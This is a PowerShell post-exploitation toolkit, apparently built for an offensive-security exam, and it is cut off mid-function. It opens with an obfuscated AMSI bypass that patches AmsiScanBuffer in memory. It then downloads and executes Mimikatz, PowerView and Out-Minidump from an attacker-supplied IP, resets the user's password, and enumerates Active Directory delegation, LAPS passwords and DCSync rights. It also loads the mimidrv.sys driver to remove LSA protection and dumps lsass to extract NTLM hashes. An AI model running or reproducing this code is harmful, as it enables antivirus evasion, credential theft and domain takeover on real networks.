# ===== [ Rasta ] ======================================
$fyvaq = @"
using System;
using System.Runtime.InteropServices;
public class fyvaq {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dpnflf, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $fyvaq

$hboxlsi = [fyvaq]::LoadLibrary("$([ChAr](97+20-20)+[cHaR](109+69-69)+[chAr]([bYTE]0x73)+[ChAr](45+60)+[ChAr]([BYtE]0x2e)+[Char](100+82-82)+[CHaR](63+45)+[char](108+51-51))")
$sgydum = [fyvaq]::GetProcAddress($hboxlsi, "$([chAR]([byTE]0x41)+[CHaR](109*93/93)+[Char]([BYtE]0x73)+[chAR](105*68/68)+[ChaR](83*65/65)+[chaR](99*91/91)+[char]([bYTE]0x61)+[ChaR]([BytE]0x6e)+[Char]([BytE]0x42)+[CHAr](7+110)+[ChAr]([byTe]0x66)+[cHAr]([bYte]0x66)+[cHAR](101)+[CHar](114))")
$p = 0
[fyvaq]::VirtualProtect($sgydum, [uint32]5, 0x40, [ref]$p) > $null
$viim = "0xB8"
$qdva = "0x57"
$jbpf = "0x00"
$smdw = "0x07"
$liei = "0x80"
$sofh = "0xC3"
$xrsph = [Byte[]] ($viim, $qdva, $jbpf, $smdw, + $liei, + $sofh)
[System.Runtime.InteropServices.Marshal]::Copy($xrsph, 0, $sgydum, 6)

<#
.SYNOPSIS
    - Intended to be run in-memory with IEX
    Post-exploitation utility, prepended with ScanBuffer 4MSI patch to perform the following actions:
    - Disable AV, remove AV definitions, disable firewall. 
    - Enable SMB, WinRM services
    - Create custom firewall rules to allow inbound traffic to SMB, WinRM, and MSSQL
    - Enumerate AppLocker restrictions if in effect
    - Checks LAPS for passwords
    - Enumerate delegations, forcechangepassword permissions, SID entries > 1000, foreign security principals
    - Remove RestrictedAdmin RDP restriction
    - Perform light AD reconnaisance
    - Dump process memory from lsass.exe and parse credentials. Proactively defeats LSA protection.
    - DCSync and trust link extraction if applicable
    - Enables DSRM admin if on a DC with proper privileges.
    - Creates PSCredential object to facilitate interdomain enumeration through WinRM
    - Proactively checks if user is running in SYSTEM context and limits usage of environmental variables just in case.


    Created as a utility script for timesaving on the OSEP exam.

    Author: Mark Fox
    License: BSD 3-Clause
    Required Dependencies: Invoke-Mimikatz.ps1, Out-Minidump.ps1, PowerView.ps1, mimidrv.sys
    Disclaimer: For academic purposes only. Do not misuse this tool.

    

.DESCRIPTION
    The getcreds function is designed to dump process memory from lsass.exe for local credentials, trust key, and domain hashes. 
    If LSA protection is enabled, use the -lsa flag.
    This function requires specifying an IP address to download necessary scripts from a remote server.

.PARAMETER IPAddress
    The IP address of the server from where the Invoke-Mimikatz, Out-Minidump, and PowerView scripts will be downloaded.
    The scripts are assumed to be hosted on TCP/80 but -Port can be used to override.

.EXAMPLE
    getcreds -ipaddress 192.168.1.1 -lsa
    This example shows how to call the getcreds function with an IP address to perform a process dump on an LSA-protected process and parse credentials.
    The -lsa flag can be omitted if LSA protection is not enabled.

#>


function adrecon {
    param (
        [Parameter(Mandatory = $true)]
        [string]$IPAddress,

        [Parameter(Mandatory = $false)]
        [int]$Port = 80
    )

    if ($Port -ne 80 -and $IPAddress -notmatch ":\d+$") {
        $IPAddress = "$IPAddress`:$Port"
    }

    # ===== [ Data visualization helper functions ] ======================================
    function Print-BoxedOutput {
        param ([string[]]$Lines)

        $maxWidth = $Lines | Measure-Object -Property Length -Maximum | Select-Object -ExpandProperty Maximum
        $topAndBottomBorder = "+" + ('-' * ($maxWidth + 2)) + "+"

        Write-Output $topAndBottomBorder
        foreach ($line in $Lines) {
            if ($line -eq "") {
                Write-Output "|$(' ' * ($maxWidth + 2))|"
            }
            else {
                $paddedLine = $line.PadRight($maxWidth)
                Write-Output "| $paddedLine |"
            }
        }
        Write-Output $topAndBottomBorder
    }

    function Wrap-Text {
        param (
            [string]$Text,
            [int]$MaxWidth,
            [int]$IndentAfterFirstLine
        )

        $words = $Text -split ' '
        $currentLine = ''
        $lines = @()
        $firstLine = $true

        foreach ($word in $words) {
            if ($firstLine) {
                if (($currentLine + $word).Length -lt $MaxWidth) {
                    $currentLine += "$word "
                }
                else {
                    $lines += $currentLine.TrimEnd()
                    $currentLine = ' ' * $IndentAfterFirstLine + "$word "
                    $firstLine = $false
                }
            }
            else {
                if (($currentLine + $word).Length -lt ($MaxWidth - $IndentAfterFirstLine)) {
                    $currentLine += "$word "
                }
                else {
                    $lines += $currentLine.TrimEnd()
                    $currentLine = ' ' * $IndentAfterFirstLine + "$word "
                }
            }
        }
        if ($currentLine) { $lines += $currentLine.TrimEnd() }

        return $lines
    }

    # ===== [ Begin AD Enumeration ] ======================================

    $domainStatus = (Get-WmiObject Win32_ComputerSystem).PartOfDomain

    if ($domainStatus -eq $true) {
        $domainName = (Get-WmiObject Win32_ComputerSystem).Domain
        Write-Output "[+] System is part of a domain: $domainName"


        # We can leave this here unless we need to resort to native AD module
        <#try {
            Get-Command Get-ADUser -ErrorAction Stop
            Write-Output "`n[+] Active Directory cmdlets are already available."
        }
        catch {
            Write-Output "`n[-] Active Directory cmdlets are not available. Attempting to load..."
            $dllName = "Microsoft.ActiveDirectory.Management.dll"
            $dllPath = "$env:TEMP\$dllName"
            $dllUrl = "http://$IPAddress/$dllName"
            Write-Output "Attempting to download $dllName..."

            Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath
            if (Test-Path $dllPath) {
                Import-Module $dllPath -ErrorAction Stop
                Write-Output "[+] Active Directory module loaded from $dllPath."
            }
            else {
                Write-Output "`n[-] DLL not found at $dllPath. Please ensure the Active Directory module is installed."
            }
        }#>

        # ===== [ Create PS credential object to mitigate double hop problems in WinRM ] ======================================
        try {
            $scriptContent = (New-Object System.Net.WebClient).DownloadString("http://$IPAddress/PowerView.ps1")
            Invoke-Expression $scriptContent
        }
        catch {
            Write-Output "[!] Could not load PowerView from remote server."
            exit
        }

        $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()

        $isSystem = $currentIdentity.User.Value -eq "S-1-5-18" -and $currentIdentity.Name -eq "NT AUTHORITY\SYSTEM"

        function Test-Admin {
            $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
            return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        }

        $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $userGroups = $currentIdentity.Groups | ForEach-Object { $_.Value }
        $specialGroupsPatterns = @("S-1-5-21-.+-513", "S-1-5-21-.+-512", "S-1-5-21-.+-519")
        $excludeGroupPatterns = @("S-1-5-32-544", "S-1-5-32-545", "S-1-5-114", "S-1-5-113", "S-1-1-0")

        function IsMemberOfSpecialGroups {
            param ([string[]]$groups, [string[]]$patterns, [string[]]$excludePatterns)
            $isDomainGroupMember = $false
            foreach ($group in $groups) {
                foreach ($pattern in $patterns) {
                    if ($group -match $pattern) {
                        $isDomainGroupMember = $true
                    }
                }
                foreach ($excludePattern in $excludePatterns) {
                    if ($group -match $excludePattern) {
                        $isDomainGroupMember = $false
                        break
                    }
                }
            }
            return $isDomainGroupMember
        }

        # Check if the computer is part of a domain
        $domainCheck = (Get-WmiObject Win32_ComputerSystem).PartOfDomain
        $domainFlag = $null
        $nonDomainJoinedUser = $false

        if ($domainCheck) {
            if (Test-Admin) {
                if (IsMemberOfSpecialGroups -groups $userGroups -patterns $specialGroupsPatterns -excludePatterns $excludeGroupPatterns) {
                    $domainFlag = "/domain"
                    Write-Output "[+] User is domain-joined and a member of a special group."
                }
                else {
                    Write-Output "[+] User is a local administrator on a domain-joined machine."
                    $nonDomainJoinedUser = $true
                    $domainFlag = "/domain"
                }
            }
            else {
                Write-Output "[+] User is domain-joined but not an administrator."
                $domainFlag = "/domain"
            }
        }
        else {
            if (Test-Admin) {
                Write-Output "[+] User is a local administrator on a non-domain-joined machine."
            }
            else {
                Write-Output "[!] User is neither a local administrator nor domain-joined."
            }
        }

        # Output the status of the domain flag
        if ($null -ne $domainFlag) {
            Write-Output "Domain flag set: $domainFlag"
        }
        else {
            Write-Output "No domain flag set."
        }


        if ($isSystem) {
            Write-Output "[+] Running as SYSTEM. Skipping PSCredential object creation."
        }
        else {
            
            if (-not (Test-Path variable:cred)) {
                try {
                    $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                    $userName = $currentIdentity.Name.Split('\')[-1]

                    if ($nonDomainJoinedUser) {
                        $command = "net user $userName 'Password123!'"
                    }
                    else {
                        $command = "net user $userName 'Password123!' $domainFlag"
                    }

                    $changePasswordResult = Invoke-Expression $command 2>$null

                    if ($changePasswordResult -match "The command completed successfully.") {
                        Write-Output "[+] Password changed to 'Password123!'"
                        $password = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
                        $cred = New-Object System.Management.Automation.PSCredential -ArgumentList ($userName, $password)
                        Write-Output "[+] PS Credential object has been created."
                    }
                    else {
                        Write-Output "[-] Unable to change current user's password."
                    }
                }
                catch {
                    Write-Output "[-] An error occurred while changing the password: $_"
                }
            }
            else {
                Write-Output "[+] PS Credential object already exists, skipping creation."
            }
        }

        # ===== [ Forest/Domain Snapshot ] ======================================
        $forestSID = $null
        $domainControllerName = $null
        $dcIP = $null
        $domainName = $null
        $domainSID = $null
        $forestName = $null
        $childDomains = @()
        $userSid = $null

        # Check if running as SYSTEM
        if ($isSystem) {
            try {
                $dcIP = (Get-NetDomainController).IPAddress
                $domainControllerName = (Get-NetDomainController).Name
                $forestSID = (Get-NetForest).RootDomainSid
                $domainSID = Get-DomainSID
                $childDomains += (Get-NetDomain).Children
                $domainName = (Get-Domain).Name
                $forestName = (Get-NetForest).Name
                $myName = [System.Net.Dns]::GetHostByName($env:computerName).HostName
            }
            catch {
                Write-Error "Failed to retrieve domain/forest information with PowerView. Error: $_"
            }
        }
        else {
            # non-SYSTEM execution
            try {
                $forestName = ([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Name)
                $domainName = (Get-WmiObject Win32_ComputerSystem).Domain
                $userSid = (whoami /user /fo csv | ConvertFrom-Csv).SID
                $domainSID = $userSid.Substring(0, $userSid.LastIndexOf('-'))
                $myName = [System.Net.Dns]::GetHostByName($env:computerName).HostName
                $domainController = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().FindDomainController()
                $domainControllerName = $domainController.Name
                $ipAddresses = [System.Net.Dns]::GetHostAddresses($domainControllerName)
                $ipv4Address = $ipAddresses | Where-Object { $_.AddressFamily -eq 'InterNetwork' } | Select-Object -First 1
                $dcIP = $ipv4Address.IPAddressToString

            }
            catch {
                Write-Error "Failed to retrieve domain/forest information. Error: $_"
            }
        }

        
        Write-Output "[+] Forest Root: $forestName"

        if ($nonDomainJoinedUser) {
            Write-Output "[!] Unable to query forest SID as non-domain user."
        }
        else {
            $forestSID = (Get-NetForest).RootDomainSid
            Write-Output "[+] Forest SID: $forestSID"
        }

        
        Write-Output "[+] Domain Name: $domainName"
        Write-Output "[+] Domain SID: $domainSID"
        Write-Output "[+] FQDN Hostname: $myName"
        Write-Output "[+] FQDN DC Hostname: $domainControllerName"
        Write-Output "[+] DC IP: $dcIP"

        if ($domainFlag -eq "/domain" -and -not $nonDomainJoinedUser) {

            # ===== [ Constrained Delegation ] ======================================
            $user_constrained = Get-NetUser -TrustedToAuth | Select-Object objectsid, samaccountname, useraccountcontrol, 'msds-allowedtodelegateto'

            if ($user_constrained) {
                Write-Output "[+] Users with Constrained Delegation found!"
                foreach ($user in $user_constrained) {
                    foreach ($property in $user.PSObject.Properties) {
                        "`t$($property.Name): $($property.Value)"
                    }
                }
                Write-Output "`t-------------------------"
            }
            else {
                Write-Output "[-] No Users with Constrained Delegation found."
            }

            $computer_constrained = Get-NetComputer -TrustedToAuth | Select-Object objectsid, samaccountname, useraccountcontrol, 'msds-allowedtodelegateto'

            if ($computer_constrained) {
                Write-Output "[+] Computers with Constrained Delegation found!"
                foreach ($computer in $computer_constrained) {
                    foreach ($property in $computer.PSObject.Properties) {
                        "`t$($property.Name): $($property.Value)"
                        Write-Output "`t-------------------------"
                    }
                }
            }
            else {
                Write-Output "[-] No Computers with Constrained Delegation found."
            }

            if (-not $user_constrained -and -not $computer_constrained) {
                Write-Output "[-] No Users or Computers with Constrained Delegation found."
            }

            # ===== [ Unconstrained Delegation ] ======================================
            $unconstrainedDelegation = @(Get-NetComputer -Unconstrained | Where-Object { $_.primarygroupid -ne 516 })
            if ($unconstrainedDelegation.Count -gt 0) {
                Write-Output "[+] Objects with Unconstrained Delegation:"
                foreach ($item in $unconstrainedDelegation) {
                    Write-Output "`tName: $($item.Name)"
                    Write-Output "`t-------------------------"
                }
            }
            else {
                Write-Output "[-] No objects with Unconstrained Delegation found."
            }

            # ===== [ RBCD ] ======================================
            $rbcdDelegation = @(Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | 
                Foreach-Object {
                    $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.Value) -Force; $_
                } | 
                Where-Object { $_.ActiveDirectoryRights -like '*GenericWrite*' })

            if ($rbcdDelegation.Count -gt 0) {
                Write-Output "[+] Objects with Resource-Based Constrained Delegation:"
                foreach ($item in $rbcdDelegation) {
                    Write-Output "`tObjectDN: $($item.ObjectDN)"
                    Write-Output "`tActiveDirectoryRights: $($item.ActiveDirectoryRights)"
                    Write-Output "`tIdentity: $($item.Identity)"
                    Write-Output "`t-------------------------"
                }
            }
            else {
                Write-Output "[-] No objects with Resource-Based Constrained Delegation found."
            }

            # ===== [ LAPS check ] ======================================
            if ((Get-WmiObject Win32_ComputerSystem).PartOfDomain) {
                $regQueryResult = reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled 2>&1
                if ($regQueryResult -match "AdmPwdEnabled\s+REG_DWORD\s+0x1") {
                    try {
                        $results = Get-DomainComputer -LDAPFilter '(ms-Mcs-AdmPwdExpirationTime=*)' | Select-Object samaccountname, 'ms-mcs-admpwd'
                        if ($results.Count -gt 0) {
                            Write-Output "[+] LAPS password recovery success!"
                            foreach ($result in $results) {
                                $samAccountName = $result.samaccountname
                                $lapsPassword = $result.'ms-mcs-admpwd'
                                Write-Output "`t$samAccountName\Administrator: $lapsPassword"
                            }
                            Write-Output "`t-------------------------"
                        }
                        else {
                            Write-Output "[-] LAPS enabled but no passwords found."
                        }
                    }
                    catch {
                        Write-Output "[!] An unknown error occurred while checking LAPS."
                    }
                }
                else {
                    Write-Output "[!] LAPS is not enabled."
                }
            }
            else {
                Write-Output "[!] System is not domain-joined. Skipping LAPS check."
            }

            # ===== [ Check for SQL servers ] ======================================
            $domainName = (Get-WmiObject Win32_ComputerSystem).Domain
            $setspnOutput = cmd /c setspn -T $domainName -Q MSSQLSvc/*

            if ($setspnOutput -match "MSSQLSvc/") {
                Write-Output "[+] SQL servers found!"
                $setspnOutput -split "\r?\n" | Where-Object { $_ -match "MSSQLSvc/" } | ForEach-Object {
                    $_ -replace '.*MSSQLSvc/([^:]+):.*', '$1'
                } | Sort-Object -Unique | ForEach-Object {
                    Write-Output `t$_
                }
                Write-Output "`t-------------------------"
            }
            else {
                Write-Output "[-] No SQL servers found"
            }

            # ===== [ User sessions ] ======================================
            $currentComputerName = $env:COMPUTERNAME
            $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
            $output = Get-NetLoggedOn -ComputerName $env:COMPUTERNAME

            $filteredOutput = $output | Where-Object {
                $_.UserName -ne $currentComputerName -and
                $_.UserName -ne $currentUser -and
                -not $_.UserName.EndsWith('$')
            } | ForEach-Object {
                "$($_.LogonDomain)\$($_.UserName)"
            } | Sort-Object -Unique

            if ($filteredOutput.Count -gt 0) {
                Write-Output "[+] User sessions found!"
                foreach ($sessionInfo in $filteredOutput) {
                    Write-Output "`t$sessionInfo"
                }
                Write-Output "`t-------------------------"
            }
            else {
                Write-Output "[-] No user sessions found."
            }


            # ===== [ Check ACLs for ForcePasswordChange Privileges ] ======================================
            $users = Get-NetUser

            foreach ($user in $users) {
                $userName = $user.samaccountname
                    
                $acls = Get-ObjectAcl -SamAccountName $userName -ResolveGUIDs | Where-Object {
                    $_.ObjectAceType -eq 'User-Force-Change-Password'
                }
                    
                if ($acls) {
                    foreach ($acl in $acls) {
                        $principal = New-Object System.Security.Principal.SecurityIdentifier($acl.SecurityIdentifier)
                        try {
                            $principalName = $principal.Translate([System.Security.Principal.NTAccount])
                            Write-Output "[+] $principalName has ForceChangePassword privileges over $userName!"
                                
                            $principalNameValue = $principalName.Value
                            $groupCheck = Get-NetGroup "$principalNameValue" -ErrorAction SilentlyContinue
                            if ($groupCheck) {
                                $groupMembers = Get-NetGroupMember -Identity $principalNameValue
                                if ($groupMembers) {
                                    Write-Output "[+] Members of $principalNameValue"
                                    foreach ($member in $groupMembers) {
                                        $memberDomainNetBIOS = ($member.MemberDomain -split '\.')[0].ToUpper()
                                        $memberName = $member.MemberName
                                        Write-Output "`t$memberDomainNetBIOS\$memberName"
                                    }
                                    Write-Output "`t-------------------------"
                                }
                                else {
                                    Write-Output "    No members found or could not resolve $principalNameValue."
                                }
                            }
                                
                        }
                        catch {
                            Write-Output "    [$userName] has User-Force-Change-Password right assigned to a SID that could not be resolved: [$principal]"
                        }
                    }
                }
            }


            ## ===== [ Domain trust links ] ======================================
            function Get-AllDomainTrusts {
                param (
                    [Parameter(Mandatory = $false)]
                    [System.Management.Automation.PSCredential]
                    $Credential
                )

                $initialDomain = Get-NetDomain
                $domainsToCheck = @($initialDomain.Name)
                $checkedDomains = @()
                $uniqueTrusts = @{}

                while ($domainsToCheck.Count -gt 0) {
                    $currentDomain = $domainsToCheck[0]
                    $domainsToCheck = $domainsToCheck[1..$domainsToCheck.Count]

                    if ($currentDomain -in $checkedDomains) {
                        continue
                    }
                    $checkedDomains += $currentDomain

                    try {
                        $trusts = if ($Credential) {
                            Get-NetDomainTrust -Domain $currentDomain -Credential $Credential
                        }
                        else {
                            Get-NetDomainTrust -Domain $currentDomain
                        }

                        foreach ($trust in $trusts) {
                            $sortedNames = @($trust.SourceName, $trust.TargetName) | Sort-Object
                            $uniqueKey = "$($sortedNames[0])-$($sortedNames[1])-$($trust.TrustDirection)"
                            if (-not $uniqueTrusts.ContainsKey($uniqueKey)) {
                                $uniqueTrusts[$uniqueKey] = $trust
                            }

                            if ($trust.TargetName -notin $checkedDomains -and $trust.TargetName -notin $domainsToCheck) {
                                $domainsToCheck += $trust.TargetName
                            }
                        }
                    }
                    catch {
                        Write-Output "[-] Failed to query trust links for domain ${currentDomain}: $_"
                    }
                }

                return $uniqueTrusts.Values
            }

            $allDomainTrusts = Get-AllDomainTrusts -Credential $cred

            if ($allDomainTrusts) {
                Write-Output "`n[+] Interdomain trust links discovered:"
                foreach ($trustLink in $allDomainTrusts) {
                    $trustAttribute = switch ($trustLink.TrustAttributes) {
                        "FOREST_TRANSITIVE" { "FOREST_TRANSITIVE" }
                        "WITHIN_FOREST" { "WITHIN_FOREST" }
                        default { "UNKNOWN" }
                    }

                    $trustDirectionSymbol = switch ($trustLink.TrustDirection) {
                        "Bidirectional" { "<->" }
                        "Inbound" { "<-" }
                        "Outbound" { "->" }
                        default { "--" }
                    }

                    Write-Output "`t$($trustLink.SourceName.ToUpper()) $trustDirectionSymbol $($trustLink.TargetName.ToUpper()) [$trustAttribute]"
                }
                Write-Output "`t-------------------------"
            }
            else {
                Write-Output "`n[-] No interdomain trust links found."
            }

            # ===== [ Forest trust links ] ======================================
            $currentForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $forestTrusts = $currentForest.GetAllTrustRelationships()
            $trustedForests = @()

            foreach ($trust in $forestTrusts) {
                if ($trust.TrustDirection -eq "Bidirectional" -or $trust.TrustDirection -eq "Outbound") {
                    if ($trust.TrustType -eq "Forest") {
                        $trustedForests += $trust.TargetName
                    }
                }
            }

            # ===== [ External forest user enumeration ] ======================================
            if ($trustedForests.Count -gt 0) {
                Write-Output "`n[+] Interforest trust links discovered:`n"
                $lines = @()
                foreach ($trustLink in $forestTrusts) {
                    $lines += "Source Name: $($trustLink.SourceName)"
                    $lines += "Name: $($trustLink.TargetName)"
                    $lines += "Trust Direction: $($trustLink.TrustDirection)"
                    $lines += "Trust Type: $($trustLink.TrustType)"
                }
                Print-BoxedOutput -Lines $lines

                Write-Output "`n[+] Users in $($forestTrusts.TargetName) forest:`n"

                foreach ($forestName in $trustedForests) {
                    $lines = @()

                    if ($null -ne $cred -and $cred -is [System.Management.Automation.PSCredential]) {
                        $users = Get-DomainUser -Domain $forestName -Credential $cred | Select-Object samaccountname, distinguishedname
                    }
                    else {
                        $users = Get-DomainUser -Domain $forestName | Select-Object samaccountname, distinguishedname
                    }

                    if ($users) {
                        $userOutput = $users | Out-String
                        $userLines = $userOutput -split "`n" | ForEach-Object { $_.Trim() }
                        $userLines = $userLines | Where-Object { $_ -ne "" }
                        $lines += $userLines
                    }
                    else {
                        $lines += "[-] No users found or unable to query the forest."
                    }
                    Print-BoxedOutput -Lines $lines
                }

                # ===== [ Foreign Security Principals ] ======================================
                $lines = @()
                $domainName = (Get-WmiObject Win32_ComputerSystem).Domain
                $foreignGroupMembers = Get-DomainForeignGroupMember -Domain $domainName

                if ($foreignGroupMembers) {
                    foreach ($foreignGroupMember in $foreignGroupMembers) {
                        
                        Write-Output "`n[+] Foreign security principals found:"
                        Write-Output "    Name: $($foreignGroupMember.GroupName)"
                        Write-Output "    SID: $($foreignGroupMember.MemberName)"
                        Write-Output "    CN: $($foreignGroupMember.MemberDistinguishedName -replace '.*,(CN=.+)$', '$1')"

                        
                        if ($null -ne $cred -and $cred -is [System.Management.Automation.PSCredential]) {
                            $foreignGroupMemberName = ConvertFrom-Sid -Sid $foreignGroupMember.MemberName -Credential $cred
                            Write-Output "    Normalized Name --> $foreignGroupMemberName"
                            Write-Output "    --------------------------------------`n"
                        }
                    }
                }
                else {
                    Write-Output "[-] No foreign group members found."
                }
                
                # ===== [ Check for ExtraSID candidates ] ======================================
                $domainName = (Get-WmiObject Win32_ComputerSystem).Domain
                $forestTrustInfo = Get-NetForestTrust
                $trustedDomains = $forestTrustInfo.TrustedDomainInformation | Select-Object -ExpandProperty DnsName
                $foreignAdmins = $null

                $localAdmins = Get-DomainGroupMember -Identity "Administrators" -Domain $domainName |
                Where-Object {
                    $sidParts = $_.MemberSID -split '-'
                    $lastPart = [int]$sidParts[-1]
                    $lastPart -gt 1000
                } |
                Select-Object MemberDistinguishedName, MemberSID

                if ($localAdmins) {
                    Write-Output "`n[+] Built-in Administrators with SID > 1000 for ${domainName}:"
                    $lines = @()
                    foreach ($admin in $localAdmins) {
                        $lines += "MemberDistinguishedName: $($admin.MemberDistinguishedName)"
                        $lines += "MemberSID: $($admin.MemberSID)"
                        $convertedName = ConvertFrom-SID -Sid $admin.MemberSID
                        $lines += "Converted Name: $convertedName"
                    }
                    Print-BoxedOutput -Lines $lines
                }

                if ($trustedDomains -and $trustedDomains.Count -gt 0) {
                    if ($null -ne $cred -and $cred -is [System.Management.Automation.PSCredential]) {
                        foreach ($trustedDomain in $trustedDomains) {
                            $foreignAdmins = Get-DomainGroupMember -Identity "Administrators" -Domain $trustedDomain -Credential $cred |
                            Where-Object {
                                $sidParts = $_.MemberSID -split '-'
                                $lastPart = [int]$sidParts[-1]
                                $lastPart -gt 1000
                            } |
                            Select-Object MemberDistinguishedName, MemberSID
                            if ($foreignAdmins) {
                                Write-Output "`n[+] Built-in external Administrators with SID > 1000 for ${trustedDomain}:"
                                $lines = @()
                                foreach ($admin in $foreignAdmins) {
                                    $lines += "MemberDistinguishedName: $($admin.MemberDistinguishedName)"
                                    $lines += "MemberSID: $($admin.MemberSID)"
                                    $convertedName = ConvertFrom-SID -Sid $admin.MemberSID -Credential $cred
                                    $lines += "Converted Name: $convertedName"
                                }
                                Print-BoxedOutput -Lines $lines
                            }
                        }
                    }
                    else {
                        Write-Output "[-] Trusted domains were found, but no valid credentials provided to check for Administrators with SID > 1000."
                    }
                }
                else {
                    Write-Output "[-] No external domains to check for built-in Administrators with SID > 1000."
                }

            }
            else {
                Write-Output "[-] No interforest trust links found."
            }

            # ===== [ Can we DCSync? ] ======================================
            $currentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
            $currentUser = $currentIdentity.Name
            $isSystem = $null -eq $currentIdentity.User.AccountDomainSid -and $currentIdentity.Name -eq "NT AUTHORITY\SYSTEM"
            $domainInfo = Get-NetDomain
            $domainDNS = $domainInfo.Name
            $dn = ($domainDNS -split '\.' | ForEach-Object { "DC=$_" }) -join ','
            $domainNetBIOS = $domainDNS.Split('.')[0].ToUpper()

            $aclMatches = Get-ObjectAcl -DistinguishedName "$dn" -ResolveGUIDs | Where-Object {
                ($_.ObjectType -match 'replication-get') -or 
                ($_.ActiveDirectoryRights -match 'GenericAll') -or 
                ($_.ActiveDirectoryRights -match 'WriteDacl')
            } | ForEach-Object {
                ConvertFrom-SID -Sid $_.SecurityIdentifier
            } | Select-Object -Unique

            if ($currentIdentity.User.Value -eq "S-1-5-18") {
                return
            }
            else {
                $userName = $currentUser.Split('\')[-1]
                try {
                    $userGroups = (Get-NetGroup -UserName $userName).name
                }
                catch {
                    Write-Warning "Unable to retrieve group memberships for $userName. Error: $_"
                    return
                }

                $normalizedUserGroups = $userGroups | ForEach-Object {
                    if ($_ -eq "Administrators") {
                        "BUILTIN\Administrators"
                    }
                    else {
                        "$domainNetBIOS\$_"
                    }
                }

                foreach ($aclMatch in $aclMatches) {
                    foreach ($normalizedGroup in $normalizedUserGroups) {
                        if ($normalizedGroup -eq $aclMatch) {
                            Write-Output "`n[+] $currentUser can DCSync $domainDNS!`n"
                            return
                        }
                    }
                }
                Write-Output "[-] $currentUser does not have DCSync rights.`n"
            }

        }
        else {
            Write-Output "[-] Not a domain user. Skipping Constrained Delegation checks."
        } 
    } #===== [ Break Conditional ] ======================================

}

function getcreds {
    param (
        [Parameter(Mandatory = $true)]
        [string]$IPAddress,
        [Parameter()]
        [switch]$lsa,
        [Parameter(Mandatory = $false)]
        [int]$Port = 80
    )

    if ($Port -ne 80 -and $IPAddress -notmatch ":\d+$") {
        $IPAddress = "$IPAddress`:$Port"
    }

    try {
        $scriptContent = (New-Object System.Net.WebClient).DownloadString("http://$IPAddress/Invoke-Mimikatz.ps1")
        Invoke-Expression $scriptContent
    }
    catch {
        Write-Output "[!] Could not load Invoke-Mimikatz from remote server."
        exit
    }

    try {
        (New-Object System.Net.WebClient).DownloadString("http://$IPAddress/PowerView.ps1") | Invoke-Expression
    }
    catch {
        Write-Output "[!] Could not load PowerView.ps1 from remote server."
        exit
    }

    # ===== [ Remove LSA protection ] ======================================
    if ($lsa) {

        Write-Output "LSA Protection is enabled. Performing specified actions...`n"
        Write-Output "Checking if mimidrv.sys driver is already loaded..."
        $service = Get-Service -Name mimidrv -ErrorAction SilentlyContinue

        # ===== [ Load mimidrv.sys driver ] ======================================
        if ($service -and $service.Status -eq 'Running') {
            Write-Output "`n[+] mimidrv.sys driver is already loaded."
        }
        else {
            Write-Output "Loading mimidrv.sys..."

            try {
                Invoke-WebRequest "http://$IPAddress/mimidrv.sys" -OutFile "$env:TEMP\mimidrv.sys" -UseBasicParsing
            }
            catch {
                Write-Output "[!] Could not load mimidrv.sys driver from remote server."
                exit
            }

            cmd /c sc create mimidrv binPath= "$env:TEMP\mimidrv.sys" type= kernel start= demand
            cmd /c sc start mimidrv
            Write-Output "`n[+] mimidrv.sys successfully loaded."
        }

        $lsassPID = (Get-Process lsass).Id
        $lsassProcess = Get-Process -Id $lsassPID
        Write-Output "Removing LSA protection on PID $lsassPID..."
        Invoke-Mimikatz -Command "`"!processprotect /process:lsass.exe /remove`""
        Write-Output "`n[+] LSA protection removed for PID $lsassPID."
    }

    # ===== [ Dump LSASS and extract hashes ] ======================================
    $lsassPID = (Get-Process lsass).Id 
    $lsassProcess = Get-Process -Id $lsassPID
    Write-Output "Dumping memory..."

    try {
        Invoke-Expression(New-Object Net.WebClient).downloadString("http://$IPAddress/Out-Minidump.ps1")
    }
    catch {
        Write-Output "[!] Could not load Out-Minidump.ps1 from remote server."
        exit
    }

    Out-Minidump -Process $lsassProcess -DumpFilePath "$env:TEMP" -ErrorAction SilentlyContinue 2>$null
    Write-Output "`n[+] Process dump for PID $lsassPID complete."

    Write-Output "Extracting credentials from dumpfile...`n`n"
   
    $isSystem = $currentIdentity.User.Value -eq "S-1-5-18" -and $currentIdentity.Name -eq "NT AUTHORITY\SYSTEM"

    if ($isSystem) {
        $minidumpFile = "C:\lsass_$($lsassPID).dmp"
    }
    else {
        $minidumpFile = "$env:TEMP\lsass_$($lsassPID).dmp"
    }

    $minidumpCommand = "`"sekurlsa::minidump $minidumpFile`""
    $logonPasswordsCommand = "sekurlsa::logonpasswords exit"

    $mimikatzOutput = Invoke-Mimikatz -Command "$minidumpCommand $logonPasswordsCommand exit" -ErrorAction SilentlyContinue 2>$null

    $uniqueEntries = @{}
    $lines = $mimikatzOutput -split "`r?`n"

    foreach ($line in $lines) {
        if ($line -match "Username\s+:\s+(\w+)") {
            $username = $matches[1]
        }
        if ($line -match "SID\s+:\s+S-\d-\d+-(\d+-){1,14}(\d+)$") {
            $userID = $matches[2]
        }
        if ($line -match "NTLM\s+:\s+([a-fA-F0-9]{32})$") {
            $ntlm = $matches[1]
            $uniqueKey = "${username}:${ntlm}"

            if (-not $uniqueEntries.ContainsKey($uniqueKey)) {
                Write-Output "${username}:${userID}:${ntlm}:::"
